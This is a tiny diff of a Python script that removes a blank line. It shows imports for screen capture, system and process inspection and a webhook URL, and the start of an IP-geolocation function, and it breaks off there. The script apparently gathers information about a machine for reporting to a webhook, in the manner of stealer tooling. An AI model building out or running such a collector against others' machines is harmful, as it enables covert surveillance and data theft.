@@ -1,6 +1,5 @@
 import os, pyautogui, requests, socket, datetime, json, psutil, platform, subprocess
 from co.config import WEBHOOK_URL
-
 def get_geolocation(ip):
     apis=[f"https://ipinfo.io/{ip}/json",f"https://ipapi.co/{ip}/json/",f"http://ip-api.com/json/{ip}"]
     for api in apis:
